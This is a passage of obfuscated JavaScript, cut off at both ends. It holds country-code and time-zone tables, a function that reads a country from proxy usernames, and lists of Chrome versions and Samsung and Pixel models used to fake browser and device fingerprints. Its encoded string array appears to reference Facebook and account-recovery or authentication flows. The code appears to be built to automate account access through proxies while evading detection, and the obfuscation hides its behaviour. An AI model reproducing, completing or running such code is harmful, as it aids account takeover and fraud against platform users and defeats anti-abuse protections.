v2["976"] = 'MN', v2["977"] = 'NP', v2["992"] = 'TJ', v2["994"] = 'AZ', v2["995"] = 'GE', v2["996"] = 'KG', v2["998"] = 'UZ', v2['7'] = 'RU';
const COUNTRY_CODES = v2;
function detectCountry(v315) {
  const v316 = v315.replace(/^\+/, '');
  for (let v317 = 0x4; v317 >= 0x1; v317--) {
    const v318 = COUNTRY_CODES[v316.substring(0x0, v317)];
    if (v318) return v318;
  }
  return null;
}
const v3 = {};
v3.US = -300, v3.CA = -300, v3.MX = -360, v3.BR = -180, v3.AR = -180, v3.CL = -240;
v3.CO = -300, v3.PE = -300, v3.VE = -240, v3.EC = -300, v3.BO = -240, v3.PY = -240, v3.UY = -180, v3.CU = -300, v3.GB = 0x0, v3.IE = 0x0, v3.IS = 0x0, v3.PT = 0x0, v3.FR = 0x3c, v3.DE = 0x3c, v3.ES = 0x3c, v3.IT = 0x3c, v3.NL = 0x3c, v3.BE = 0x3c, v3.AT = 0x3c, v3.CH = 0x3c, v3.DK = 0x3c, v3.SE = 0x3c, v3.NO = 0x3c, v3.PL = 0x3c, v3.CZ = 0x3c, v3.SK = 0x3c, v3.HU = 0x3c, v3.HR = 0x3c, v3.SI = 0x3c, v3.BA = 0x3c, v3.RS = 0x3c, v3.AL = 0x3c, v3.LU = 0x3c, v3.FI = 0x78, v3.RO = 0x78, v3.BG = 0x78, v3.GR = 0x78, v3.UA = 0x78, v3.MD = 0x78, v3.LT = 0x78, v3.LV = 0x78, v3.EE = 0x78, v3.EG = 0x78, v3.ZA = 0x78, v3.IL = 0x78, v3.LB = 0x78, v3.JO = 0x78, v3.SY = 0x78, v3.BY = 0xb4, v3.RU = 0xb4, v3.TR = 0xb4, v3.SA = 0xb4, v3.IQ = 0xb4, v3.KW = 0xb4, v3.BH = 0xb4, v3.QA = 0xb4, v3.YE = 0xb4, v3.KE = 0xb4, v3.ET = 0xb4, v3.TZ = 0xb4, v3.UG = 0xb4, v3.SO = 0xb4, v3.MG = 0xb4, v3.IR = 0xd2, v3.AF = 0x10e, v3.AE = 0xf0, v3.OM = 0xf0, v3.AZ = 0xf0, v3.GE = 0xf0, v3.AM = 0xf0, v3.MU = 0xf0, v3.SC = 0xf0, v3.PK = 0x12c, v3.UZ = 0x12c, v3.TJ = 0x12c, v3.TM = 0x12c, v3.MV = 0x12c, v3.KG = 0x168, v3.IN = 0x14a, v3.LK = 0x14a, v3.NP = 0x159, v3.BD = 0x168, v3.BT = 0x168, v3.KZ = 0x168, v3.MM = 0x186, v3.TH = 0x1a4, v3.VN = 0x1a4, v3.KH = 0x1a4, v3.LA = 0x1a4, v3.ID = 0x1a4, v3.MY = 0x1e0, v3.SG = 0x1e0, v3.PH = 0x1e0, v3.CN = 0x1e0, v3.HK = 0x1e0, v3.TW = 0x1e0, v3.MN = 0x1e0, v3.BN = 0x1e0, v3.JP = 0x21c, v3.KR = 0x21c, v3.AU = 0x258, v3.NZ = 0x2d0, v3.GH = 0x0, v3.NG = 0x3c, v3.CM = 0x3c, v3.CD = 0x3c, v3.CG = 0x3c, v3.GA = 0x3c, v3.CI = 0x0, v3.SN = 0x0, v3.ML = 0x0, v3.GN = 0x0, v3.BF = 0x0, v3.NE = 0x3c, v3.TG = 0x0, v3.BJ = 0x3c, v3.LR = 0x0, v3.SL = 0x0, v3.TD = 0x3c, v3.CF = 0x3c, v3.GQ = 0x3c, v3.AO = 0x3c, v3.RW = 0x78, v3.BI = 0x78, v3.MZ = 0x78, v3.ZM = 0x78, v3.ZW = 0x78, v3.NA = 0x78, v3.MW = 0x78, v3.SD = 0x78, v3.DZ = 0x3c, v3.TN = 0x3c, v3.LY = 0x78, v3.MA = 0x3c, v3.GM = 0x0;
const COUNTRY_TIMEZONE_OFFSETS = v3;
function extractProxyCountry(v319) {
  if (!v319 || !v319.user) return null;
  const v320 = v319.user.match(/[_-]zone[_-]([A-Za-z]{2})/i);
  if (v320) return v320[0x1].toUpperCase();
  const v321 = v319.user.match(/[_-]country[_-]([A-Za-z]{2})/i);
  if (v321) return v321[0x1].toUpperCase();
  const v322 = v319.user.match(/[_-]cc[_-]([A-Za-z]{2})/i);
  if (v322) return v322[0x1].toUpperCase();
  return null;
}
function getTimezoneOffset(v323) {
  if (!v323) return -480;
  const v324 = COUNTRY_TIMEZONE_OFFSETS[v323.toUpperCase()];
  return v324 !== undefined ? v324 : 0x0;
}
function resolveTimezone(v325, v326) {
  const v327 = extractProxyCountry(v325);
  if (v327) return dbg("TIMEZONE: Resolved from proxy _zone_ → " + v327 + " → UTC" + (getTimezoneOffset(v327) >= 0x0 ? '+' : '') + getTimezoneOffset(v327) / 0x3c + "h (" + getTimezoneOffset(v327) + "min)"), getTimezoneOffset(v327);
  if (v326) {
    const v328 = detectCountry(v326);
    if (v328) return dbg("TIMEZONE: Resolved from phone → " + v328 + " → UTC" + (getTimezoneOffset(v328) >= 0x0 ? '+' : '') + getTimezoneOffset(v328) / 0x3c + "h (" + getTimezoneOffset(v328) + "min)"), getTimezoneOffset(v328);
  }
  return 0x0;
}
function randomSessionId() {
  let v329 = '';
  for (let v330 = 0x0; v330 < 0xa; v330++) v329 += "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"[Math.floor(Math.random() * "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".length)];
  return v329;
}
const v4 = {};
v4.major = 0x8a, v4.build = 0x1c24, v4.minPatch = 0x32, v4.maxPatch = 0xb4;
const v5 = {};
v5.major = 0x8b, v5.build = 0x1c5a, v5.minPatch = 0x32, v5.maxPatch = 0xb4;
const v6 = {};
v6.major = 0x8c, v6.build = 0x1c7e, v6.minPatch = 0x32, v6.maxPatch = 0xb4;
const v7 = {};
v7.major = 0x8d, v7.build = 0x1cbe, v7.minPatch = 0x32, v7.maxPatch = 0xb4;
const v8 = {};
v8.major = 0x8e, v8.build = 0x1cf3, v8.minPatch = 0x32, v8.maxPatch = 0xb4;
const v9 = {};
v9.major = 0x8f, v9.build = 0x1d2e, v9.minPatch = 0x32, v9.maxPatch = 0xb4;
const v10 = {};
v10.major = 0x90, v10.build = 0x1d66, v10.minPatch = 0x32, v10.maxPatch = 0xb4;
const v11 = {};
v11.major = 0x91, v11.build = 0x1d97, v11.minPatch = 0x32, v11.maxPatch = 0xb4;
const v12 = {};
v12.major = 0x92, v12.build = 0x1dca, v12.minPatch = 0x32, v12.maxPatch = 0xb4;
const v13 = {};
v13.major = 0x93, v13.build = 0x1dfe, v13.minPatch = 0x32, v13.maxPatch = 0xb4;
const v14 = {};
v14.major = 0x94, v14.build = 0x1e38, v14.minPatch = 0x32, v14.maxPatch = 0xb4;
const v15 = {};
v15.major = 0x95, v15.build = 0x1e73, v15.minPatch = 0x32, v15.maxPatch = 0xb4;
const v16 = {};
v16.major = 0x96, v16.build = 0x1ebf, v16.minPatch = 0x32, v16.maxPatch = 0xb4;
const v17 = {};
v17.major = 0x97, v17.build = 0x1ef2, v17.minPatch = 0x32, v17.maxPatch = 0xb4;
const v18 = {};
v18.major = 0x98, v18.build = 0x1f29, v18.minPatch = 0x28, v18.maxPatch = 0xa0;
const v19 = {};
v19.major = 0x99, v19.build = 0x1f5c, v19.minPatch = 0x1e, v19.maxPatch = 0x96;
const v20 = {};
v20.major = 0x9a, v20.build = 0x1f95, v20.minPatch = 0x14, v20.maxPatch = 0x78;
const CHROME_VERSIONS = [v4, v5, v6, v7, v8, v9, v10, v11, v12, v13, v14, v15, v16, v17, v18, v19, v20],
  v21 = {};
v21.ver = "24.0", v21.chrome = "149.0.7795.136";
const v22 = {};
v22.ver = "25.0", v22.chrome = "150.0.7871.114";
const v23 = {};
v23.ver = "26.0", v23.chrome = "151.0.7922.150";
const v24 = {};
v24.ver = "27.0", v24.chrome = "152.0.7977.64";
const SAMSUNG_VERSIONS = [v21, v22, v23, v24],
  v25 = {};
v25.brand = "Samsung", v25.model = "SM-S938B", v25.os = '15';
const v26 = {};
v26.brand = "Samsung", v26.model = "SM-S928B", v26.os = '14';
const v27 = {};
v27.brand = "Samsung", v27.model = "SM-S918B", v27.os = '14';
const v28 = {};
v28.brand = "Samsung", v28.model = "SM-S926B", v28.os = '14';
const v29 = {};
v29.brand = "Samsung", v29.model = "SM-S921B", v29.os = '14';
const v30 = {};
v30.brand = "Samsung", v30.model = "SM-S908B", v30.os = '13';
const v31 = {};
v31.brand = "Samsung", v31.model = "SM-S901B", v31.os = '13';
const v32 = {};
v32.brand = "Samsung", v32.model = "SM-G991B", v32.os = '13';
const v33 = {};
v33.brand = "Samsung", v33.model = "SM-A556B", v33.os = '14';
const v34 = {};
v34.brand = "Samsung", v34.model = "SM-A546B", v34.os = '13';
const v35 = {};
v35.brand = "Google", v35.model = "Pixel 9 Pro XL", v35.os = '15';
function fn1() {
  const v331 = ['otyZ', 'ihWGtM9by2nVDw50oIa', 'zxqTruuSzxq7Ct0WlJKSzw47Ct0WlJG', 'C21Z', 'su5urvjoquXFsu5guKfFC2nYzwvUx2LK', 'ixjLzG', 'xcTCkYaQkd86w2eTEKeTwL8KxvSWltLHlxPblvPFjf0Qkq', 'BwfJAgLUzv9Pza', 'BwfWAwTLEq', 'mtuZ', 'C3rKAw8', 'mJi1', 'wMjIugy', 'tMv3ihbHC3n3B3jKigzVCIbJB25MAxjTzwqGywnJB3vUDhmGw2rLzMf1Bhq6ifbHC3n3B3jKqdiWmJzDoG', 's1Dwt3i', 'BI9H', 'qM9ZBMLH', 'u0vrvgq', 'sNnqALq', 'x3nPzf8', 'u2fTC3vUzW', 'tMfIyw0', 'yNnRBha', 'zw4TqLOSzw47Ct0WlJK', 'AhHvCNy', 't0HnteK', 'zMjFzhrZzYaGidOG', 'D2vPz2H0', '8j+hP/cFH7C', '4PYfieXbvu5dsa', 'u1rbvfvtx0nbtKnfta', 'zwPLug8', 'u3bYrxa', 'yxjFy29UDgv4Df9LEgnLChrPB24', 'uePnBuW', 'AxnFBMf0Aw9UywW', 'v0H0zwq', 'ktOG', 'tvro', 'AxnFBg9HzgLUzW', 'mJmW', 'iejmt0TtifnfqvjdscbgquLmoIbUBYbJB250zxH0x2rHDgeGAw4GC2vHCMnOihjLC3bVBNnL', '8j+rKsa', 'z3jLzw5cCMLNAhq', '8j+hP/cFH64', 'AvbOB25LmtCSmq', 'vxnLihnHDMvKigTLEq', 'quz0Cg4', 'rgPPyM91DgK', 'txz3B3i', 'zNiTreOSzNi7Ct0WlJKSyxi7Ct0WlJG', '8j+hTFcFH6y', '8j+hUpcFH78', 'rhrpquO', '8j+hQ/cFH64', 'y29UDgv4Df9KyxrHoIa', 'C2vSzwn0x3vYAq', 'iJe1lJaUmci', 'yxv0B0nVDw50CNK', 'ntK3', 'AfbKvvy', 'A2nsqwW', 'y29Kzv9LBNrYEq', 'yMfZzty0', 'x19JB21LDf9Yzxe', 'Bw9KzwW', 'EuPKyMi', 'lxnZAwqT', 'C29YDa', 'DxnLq0fbqwnJB3vUDfnLyxjJAfnLBgvJDe11Dgf0Aw9U', 'C2vHCMnOx3f1zxj5', 'rw50zxiGtMv4yu9uucbbueKGs2v5icHVCIb0ExbLicDIywnRjYK6', 'sK9xwMG', 'q3jPC2S', 'mtCYmq', 'z2v0ugHVBMvdB3vUDhj5', 'BLPouMy', 'u0vmx0fdq1rFqvnztKm', 'BMfTzq', 'zw4Tr0iSzw47Ct0WlJK', 'ChjVzMLSzv9WAwnFDxjS', 'C3eTquWSC3e7Ct0WlJKSzw47Ct0WlJG', 'yuL0reu', 'tw96AwXSys81lJaGkfDPBMrVD3mGtLqGmtaUmdSGv2LUnJq7ihG2ncKGqxbWBgvxzwjlAxqVntm3lJm2icHlsfrntcWGBgLRzsbhzwnRBYKGq2HYB21LlW', 'l3yXl251Bxn1y2nLC3mVAw5MBW', 'CMvZB2X2zuXHBMD1ywDLrM9YuMvXDwvZDa', 'uwHUCNC', 'vKDWExq', 'CMv2', 'zurWDgK', 'zw5LDhvUCMvHy2G', 'r0XhDMS', 'vM9KywzVBMuGsvq', 'mtG2ndyZnfzbAwTgDW', 'qxbWBguGqte4ifbYBW', 'vffMwhG', 'ndeYEdCZmG', 'rM16AM8', 'DuflCxe', 'mZu3', 'AgrdAuS', 'u2vYDMvYidiGkc9WmI9NzxqP', 'iIaOiG', 'zxmTtKKSzxm7Ct0WlJK', 'rgvZA3rVCa', '8j+tPIbbBgWGkezck0Lhk01LDgeP', 'CgHVBMvdB250zxH0rgf0yq', 'zw5JB2rLx3jHBMDL', 'yNvPBgrqyxjHBxm', '8j+hSpcFH7m', 'cIaG4PYxie5LDhDVCMSGzxjYB3iGzhvYAw5NihnLC3nPB24GCgLUzY4GrxHPDgLUzY4UlGO', 'BNv2DgG', 'ywXS', 'AMH2zdjKoJi', 'C2vJlwnOlq', 't1nvuuS', 'zLrduw8', 'B3nuywC', 'BwTKAxjtEw5J', 'yxbWBgLJyxrPB24VANnVBG', 'CMvZzxq', 'rK1Ss1e', 'mtGUma', 'qw5NDwLSBge', 'mtyUnG', 'w0niqvqGu1vque9svf0Gsfruuca', 'iZe4nZDgmG', 'sgfPDgK', 'EwrKAwq', 'r2XQv1C', 'iIWG', 'yxbPs2v5', 'mJjenJa', 'yxjFruC', 'Bwf0y2HbBgW', '4PscifVIGkjDifrVB2WGicaGica6ia', '8j+hRVcFH7G', 'zxmTrvmSzxm7Ct0WlJKSzw47Ct0WlJG', 'uM9Tyw5Pyq', 'EwDzCKi', 'senzBLm', 'nda4odK1zvHYqw1I', 'B3rWx25VDf9KAxnWyxrJAgvK', 'BM90x2zVDw5K', 'xsbvBMnHDwDODev4y2vWDgLVBJOG', 'zNvUy3rPB24GkLWOicPCkq', 't0HPEMW', 'yMHXz2e', 'mti2na', 'y2XVDwrFDhj1C3rFDg9Rzw4', 'lgHLAwDODd0', 'tK9ilu5yoq', 'ChjVEhKGy29UBMvJDgLVBIbMywLSzwq', 'zgf0CIaGicaGidOG', 'cIaG4Pwu4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwx', 'twfJyxu', 'y2fSBa', '8j+hS/cFH6O', 'ru5urviGufjpwfK', 'Bg9PC190B2TLBG', 'C2v0vgLTzw91Da', 'C2vJlwDWyW', 'mZG3', 'icaBwZmYBvVINjnDieXPy2vUC2uGDMfSAwqG4OcuifDLBgnVBwuHg1SWBq', '8j+hU/cFH7mGvMLLDg5HBwvZzsaODMKTvK4SDMK7Ct0WlJKP', 'A0rnBNy', 'w0jmt0Ttifnfqvjdsf0GrxH0CMfJDgvKignVBNrLEhrFzgf0ysbMCM9TiejSB2TZierttdOG', 'mY4W', 'w1nfqvjdsf0Gy3vPzcbLEhrYywn0zwq6ia', 'teX0Chq', 'BKTnAu4', 'BNrmA2q', 'tMv0AgvYBgfUzhm', 'wgPUv2O', '8j+uHcbhBYbiB21LicHszxn0yxj0iokaLcbWAwnRigeGzgLMzMvYzw50igzPBguP', 'AxqTsvqSAxq7Ct0WlJKSzw47Ct0WlJG', '8j+sOsbdDxn0B20Gq29TyMLUyxrPB24Gsw5WDxq6', 'yK5Zt1q', 'tNb2y24', '8j+hUFcFH60GvgHHAsaODgGTveGSDgG7Ct0WlJKP', 'mJq1odbeBLPNu0e', 'zw4Tq0eSzw47Ct0WlJKSzNiTq0e7Ct0WlJG', 'B2T0u2y', 'B3rWugf0Aa', 'zw4TsuuSzw47Ct0WlJK', 'u3rLEcdWN5sL', 'CgP3zwm', 'cIaG4PYtief1Dg8GuMfUz2u6ia', 'qKfdsW', '8j+hUpcFH7q', 'D0vPt0e', 'C3bSAwnL', 'BM9FCgX1C19UDw1Izxi', 'u0SG4OcuiezcifjLC2v0icaGicaGicaGicaGicaGia', 'BwHyv1K', 'w1nftKrDienVzguGCgfNzsbTzxjNzwqUihnMAxu9', 'C2vUzf9ZBxm', 'vgfUEMfUAwe', 'y2Prs2y', 'BwfYAY52AweUz3a', 'yM4TqKqSyM47Ct0WlJKSzw47Ct0WlJG', 'y3vPzdOGtK9uiezpvu5eicHSAwTLBhKGBxvSDgKTywnJB3vUDcK', '8j+hT/cFH7W', 'v0zXthy', 'y2fHx2nVCMvFzgf0yv9LBMnYExb0zwq', 'rLD4vvi', 'CMXjwgG', 'Ec1MyI1KzxzPy2uTCMfT', 'ChjVEhLjzhG', 'rxz5q2O', 'qMXVA3mGu01tihnLBMqGzxjYB3i', 'EMvYB19IywXHBMnLx3n0yxrL', 'v3fLtKi', 'A1zKAeS', '8j+hR/cFH7q', 'rhvJA0r1y2ThBYbxAw5KB3DZ', 'zM9YicG7oYK7EW', 'icaGicaGicaGicaGicaGicaGicaGicb8x3WGicaGicaGicaGicaGicaGicaGicaGicaGicaGicaGihXFx18Vicak', 'vuLQqxC', 'twfSAs1hnZe1ieLTBw9YDgfSAxmGtumXma', 'wNbtqMC', 'yxiTsK8Syxi7Ct0WlJKSzw47Ct0WlJG', 'ueTLru4', 's1nzu2O', 'C3rHCNrZv2L0Aa', 'pt09pt09pt09pt09pt09pt09pt09pt09pt09pt09pt09pt09pt09pt09pt09pt09pt09pt09pt09pt09pt09pt09pt09pt09pt09pt09pt0k', 'tMLNzxjPyq', 'nY4WlJaGicaGicaGicaGicaGicaGicaGicaGica', 'vwDHBMrH', 'iej1AwXKl1rqmueUmJmXmdeXlJa2nYKGqxbWBgvxzwjlAxqVntm3lJm2icHlsfrntcWGBgLRzsbhzwnRBYKGq2HYB21LlW', 'twnSwfa', 'ALznC08', 'AgrNu3G', 'zgf0yq', 'o0zcu1yV', 'AwrLBNrPDhK', 'yw4GzxjYB3iGB2nJDxjYzwq', 'DMvYC2LVBG', 'mJy5', 'CgrOCw4', 'Cwf5uwm', 'Bwf4uhjPy2u', 'y3vPzcaOC2LUz2XLlwfJy3qPoIa', 'zLrUqMy', 'whzqEui', 'AKXWwfG', '8j+tMcbgywnLyM9VAW', 'zgvIDwCUDhH0', 'xsbvBMHHBMrSzwrszwPLy3rPB246ia', 'C3vJy2vZCW', 'C2vZC2LVBG', 'v3nOuhi', 'twvKAwfuzwSGrgLTzw5ZAxr5idyWmJa', 'idiWma', 'zfL1t2G', 'v2T0t2S', 'y29TlMjSB2TZlND3DY5JyweUyxiUyxv0Af9TzxrOB2q', 'y29Kzv9LBNrYEt0', 'mJu3mJa0mZm3mJC2ndy0mZG', 'qwLYDgvS', 'tgL0AhvHBMLH', 'qMvSz2L1Bq', 'w1nftKrDif9FAhnKCf9JB2rLigzYB20Gy29KzsbWywDLicHLBMnVzgvKkq', '8j+hV/cFH7W', 'tI4GtwfJzwrVBMLH', '8j+tSsbbDxrVigzLDgnOigzYB20Gu01tiejVD2vY', 'mJm4', 'FtTgqKrhlZe7rKjjqs9gqKLpuZTD', 'sfHTqNq', 'zK5ZteG', 'zMLSDgvY', 'v0Lgsq', 's3jTt1C', 'zMjFzgLHBg9NoIa', 'ALzywva', 'y29UDgfJDhbVAw50CW', 'CMfUz2u', 'vw5ZDxbWB3j0zwqGu09ds1mGyxr5CdOG', 'swDszKW', 'zwXPr1y', 'zMXVB3i', 'zwDVBfe', 'ugfRAxn0yw4', 'mJa1mKDsA3jouG', 'tgDzyvG', 'zMLSzv9JDxn0B20', 'yM9Sza', 'ihWGq291BNrYEtO', 'Dvr6sLu', 'qvvutYbdt05gsvjnie9uucbHzNrLCIbszxnLDd8GwW', 'AwrLBNrPzMLLCL9ZB3vYy2u', 'q09otKvdvca', 'q0PvqK0', '8j+hSFcFH7a', 'qMvYBxvKyq', 'zNiTq0KSzNi7Ct0WlJK', 'oJu1', 'zw4TtKCSzw47Ct0WlJK', 'qY4GqwzYAwnHBIbszxaU', 'Ahr0Chm6lY93D3CUzMfJzwjVB2SUy29T', 'cIaGqwjVCNrLzc4k', 'tuLtuW', 'DxnLCKfNzw50', 'veLnieLu', 'vwvmqNG', 'swTTDLO', 'qwrYzw5VidC1ma', '8j+hU/cFH6W', 'u1Llv0G', 'EfzNtgy', 'Dg9mB2nHBgvtDhjPBMC', 'u2vSzwn0qwnJB3vUDenVBNrYB2XSzxi', '8j+hSVcFH7S', 'rdHKC2fSyJDZshDhCgHABu5dAvrMvZfh', '4QYf77IpieDViejHy2SGDg8GqNjVD3nLCIbtzwXLy3rPB24', 'mcbszxrYAwvZicaOuhjVy2vZCYbVBMnLlcbUBYbYzxrYAwvZkq', 'shvwyw8', '8j+hQFcFH78', 'r2vVCMDPyq', 'rg12B3e', 'rw50zxiGBNvTyMvYig9Mie9uucbYzxnLBMrZihbLCIbUDw1IzxiGw2rLzMf1Bhq6idbDoG', 'AvbHzcbpuYaXoa', 'iej1AwXKl1fluteUmJaWmte0lJaWmJSGD3yPiefWCgXLv2vIs2L0lZuZnY4ZnIaOs0HutuWSigXPA2uGr2vJA28PifzLCNnPB24Vnc4WienOCM9Tzs8', 'o0zctemV', 'qLr5q0y', 'tuPwC3a', 'ihWGzNvSBd0', 'g1SYsHTBsa', 'mdqUiefUzhjVAwqGq2HYB21L', 'rvvkzgq', 'rgLyAuy', 'zw4TsK0Szw47Ct0WlJK', '8j+hSVcFH7y', 'ihWGq291BNrYEtOG', 'zuLgrwC', 'v2HHDcb3B3vSzcb5B3uGBgLRzsb0BYbKBZ8', 'tgLJzw5Zzwq', 'qNjyz28', 'AvbOB25Lide0', 'iK5VDdTbpujYyw5KiJT2psiYnci', 'ogq3yta5otCWnwm2ote4otCZzJLLyJyZodK0nMvJnZbMogi5mdiZnZrLzwqZntu4mda2nJu5yMrMndvKmJy4yG', 'DxOTvvOSDxO7Ct0WlJKSCNu7Ct0WlJG', 'rgnmEe0', 'mtC2nW', 'wvLWt28', 'ksbbChbSzvDLyKTPDc81mZCUmZyGkeTive1mlcbSAwTLieDLy2TVksbdAhjVBwuV', 'EvfPwfK', 'AvbOB25LmtuSmW', 'BM8Gy2LWAgvYigLUigLUAxrPyxrLihzPzxC', 'zw5KC1DPDgG', 'C29JA3m1', 'q1bimJyWoq', 'zNiTveCSzNi7Ct0WlJK', 'ChLpzxa', 'ruHpu1rvtLjfquni', 'lcaIr29Vz2XLienOCM9Tzsi7DJ0I', 'y29UC29Szv9VDxrWDxqUBg9N', '8j+hUpcFH6y', 'ihWGvgfYz2v0ienVDw50oIa', 'runyu1i', '8j+hUpcFH7K', 'lJaUma', 'vwzVBMu', 'q29UC29SzsbUzxr3B3jRoIa', 'tMfTAwjPyq', 'u3rLEa', 'mJffmJm2', 'y29UDgfJDf9WB2LUDf90ExbL', 'DMLnveu', 'z3bZvMvYC2LVBG', 'vg9quLm', 'y3LHBG', 'l01yuZq3rKXgwdbvl3rUzxnZl0bWDwjSAwmVyxbPl2DLDg51Bq', 'cIaG4PYxienVDwXKig5VDcbNzw5LCMf0zsbiyxjKD2fYzsbjrc4k', 'icdILzRILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILz0k', 'DMLH', 'w1nfqvjdsf0GrxH0CMfJDgvKigfJy291BNrvAwq6ia', 'iokuGIbqCM94EtOG', 'wKHntgO', 'mJK5', 'ig1LDgHVzd0', 'mdiUieDVB2DSzsbqAxHLBca4lZKGtw9IAwXLifDLyIaOq2HYB21Lide1mIK', 'sw50tfu', 'AxnnDwX0Aq', 'Cfv0BNy', 'tgrYAMm', 'C2WTu0KSC2W7Ct0WlJKSzw47Ct0WlJG', 'ndK1lJaUmc4ZmY4Xmti', 'ie1VyMLSzsbtywzHCMKVntm3lJm2ifTgqL9jquiVrKi0qtTgqKfwlW', 'BgLNAhq', 'tw96yw1IAxf1zq', 'z2v0ugHVBMvmyw5N', 'r1PiDfi', 'mtq2', 'qMPHtgC', 'vwn2see', 'ugzkAg0', 'EgXZEa', '8j+hUFcFH60', 'DMKTvK4SDMK7Ct0WlJK', 'AvbOB25L', 'uwf0yxi', 'y3jguxq', 'tMv3ifPLywXHBMq', 'rMLUBgfUza', 'tw9UDhnLCNjHDa', 'zgvIDq', 'zMLUza', 'DgXoy1a', 'B3rWx3nLBNqUDhH0', 's1rxuMm', 'tuX3tMi', 'Aw5ZDgfNCMfT', 'BwfJt1mGu2fMyxjP', 'x19ZCgLUx3i', 'twfSAs1hnJeWie1dnG', 'wwvZic0Gug9SBcbpvfaGjIbJAgfUz2uGCgfZC3DVCMqGyxv0B21HDgLJywXSEq', '8j+hQFcFH7i', 'u3qUifbPzxjYzq', '8j+hTpcFH7i', 'tw96AwXSys81lJaGkefUzhjVAwqG', 'C2vJlwnOlxvHlw1VzgvS', 'ic0+ia', 'mZCW', 'CfL1Bge', 'C2fTzs1VCMLNAw4', 'vMHsEwW', '8j+hP/cFH6W', 'zw4TqvuSzw47Ct0WlJK', 'mtm4', 'BgDqwuS', 'qxbWBguGrZe0icG0lwnVCMuP', 'AKTnvKK', 'mtCUns4X', 'r3vHDgvTywXH', 'r0vuihrPBwvVDxq', 'cIaGg1SZmM3INjmGq29WAwvKia', '8j+hUFcFH7W', 'AMHKChq', 'svnhExG', 'v3fis3G', 'AgKTsu4SAgK7Ct0WlJK', 'ywnJB3vUDfvPza', 'vvnfuIbdse9trsbutYbdtevbuIbquK9ysuvt', 'mZGW', 'zxmTr1eSzxm7Ct0WlJKSzNi7Ct0WlJG', 'rMfgAxe', 'z2v0ugf0Aa', 'w1nftKrDiev4DhjHy3rLzcbFx2HZoIa', 'y0XirfC', 'Ec1MyI1KzxzPy2uTBMv0lxf1ywXPDhK', 'y29VA2LLu3rY', 'C2vYAwfSAxPLzf9ZDgf0zxm6ig5VDcbMB3vUzcaODxnPBMCGzMfSBgjHy2SP', 'C3bSAxq', 'y2Pfzhq', 'C1vhrLG', 'ugfYC2uGzMfPBgvK', 'C29J', '8j+hQpcFH7C', 'CMvWzwf0', 't0rHzM0', 'CeHuEhG', 'uwfNruK', 'nta0', 'yxiTt00Syxi7Ct0WlJKSzw47Ct0WlJG', 'mtyUnW', 'y29UBLr5Cgu', 'n2jLC3vMoJm', 'BxDLyL9WAxHLBdG', 'AxnuvfK', 'q2XHCM8', 'wc1szxf1zxn0zwqTv2L0Aa', 'Dgv4Dc9ODg1SlgfWCgXPy2f0Aw9Ul3HODg1Sk3HTBcXHChbSAwnHDgLVBI94BwW7Ct0WlJKSAw1Hz2uVyxzPzIXPBwfNzs93zwjWlgLTywDLl2fWBMCSkI8Qo3e9mc44', 'Bg9NAw5Fzw50CNLFCg9PBNq', 'AurpC1y', 'mtyUnq', 'qxDAz2W', 'BLD1Ew8', 'Ec1MyI1KzxzPy2uTzMCTDgLTzq', 'mZuX', 'AfrZrwy', 'CMvHzezPBgu', 'cIaG4PYxifvWzgf0zsbYzxf1AxjLzceGugXLyxnLigrVD25SB2fKihrOzsbSyxrLC3qGDMvYC2LVBI4k', 'iKXPBNv4iG', '8j+hQVcFH6W', 'CMvZB2X2zq', 'y29TlMjSB2TZlND3DY5JyweUyxiUyxv0Af9VChrPB25FC2vSzwn0Aw9UlMfZEw5J', '8j+hSVcFH70', 'uMvTB3zLihnHDMvKigTLEq', 'DMLmqMG', 'y2fHx2fYx2zIx2LUAxrPyxrLx3zPzxC', 'otC1', 'zgv0zwn0q291BNrYEq', 'su1uAgq', 'u00TuZKZoei', 'qxbir1e', 'C2vJlwnOlxvHlwz1BgWTDMvYC2LVBI1SAxn0', 'qxj1yMe', 'Ec1MyI1KzxzPy2uTBw9KzwW', 'sMfWyw4', 'mtuUien1C3rVBsbdB21IAw5HDgLVBG', 'sxnIzeG', '8j+tSsbnB2jPBguGkg0UzMfJzwjVB2SUy29Tksa', 't3fHEgq', 'u29UEq', 'tw9Uz29SAwe', 'tNLIs2C', 'EhjABMi', 'mJeX', 'AhHJrgq', 'xtOG', 'rgz0uMS', 'vMvWyKi', 'D0jXEKm', '8j+hUFcFH7q', 'u3qUieHLBgvUyq', 'BwLU', 'u0SG4OcuifjLC2v0iokuGIbgywLSzwqVrhjVCcdIHPiG', 'rfzsELu', 'mJu4', 'zMfTAwX5x2rLDMLJzv9Pza', 'ue5hCg0', 'AwqTsuqSAwq7Ct0WlJKSzw47Ct0WlJG', 'AgjlAgC', 'ihWGqNjVD3nLCJOG', '8j+hP/cFH6S', 'q2nvs00', 'DgTmueu', 'Ag5fuvG', 'q1bimJu4mq', 'DLDHu20', 'mtq3', '4QYf77IpieDViejHy2S', '8j+hRpcFH6S', 'odu1', 'y2HYB21Lx2XPBNv4', 'y3vPzdOG', '8j+hPVcFH7q', 'D2f0zxjMywXSidOG', 'AMf6B2vZDa', 'CM91BMq', 'DgGTveGSDgG7Ct0WlJK', 'BvzurxG', '8j+hQ/cFH7q', 'BNPpz1m', 'Ec1MyI1KzxzPy2uTz3b1', 'y2XPshu', 'u0vmrunux0fdq09vtLrFqvnztKm', 'zw4TqKiSzw47Ct0WlJK', 'q2nlzey', 't3jPz2LU', 'CgfYyw1Z', 'BxnLzgDL', 'sLjZz1y', 'mdyUifnHBxn1BMCGsw50zxjUzxq', 'uKzAEuS', '8j+hPVcFH7G', 'lJaUmc4WiG', 'ugrNue8', 'twfSAs1hnJeWie1dna', 'DxbKyxrLx3jLCxvPCMvK', 'jM1HEfbYAwnLpq', 'rxrOAw9WAwe', 